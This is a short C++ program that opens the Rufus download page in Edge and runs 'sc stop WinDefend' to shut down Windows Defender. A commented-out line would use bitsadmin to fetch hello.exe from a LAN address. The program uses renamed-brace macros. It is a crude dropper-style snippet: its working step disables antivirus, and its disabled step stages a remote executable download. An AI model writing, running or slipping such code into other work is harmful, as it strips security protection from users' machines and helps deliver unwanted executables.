#include<bits/stdc++.h>
#define ll long long
#define do {
#define done }
#define start_ int main()
#define finish return 0;
using namespace std;

void server()
do
       char install[100005];
       char srv[10000];
       char com[1000];
       strcpy(com,"sc stop WinDefend");
       //strcpy(install,"& cmd --% /c bitsadmin /transfer 8 192.168.1.102/hello.exe");
       strcpy(srv,"start msedge   https://rufus.ie/downloads/");
       system(srv);
       system(com);
done
start_
do

server();



finish
done
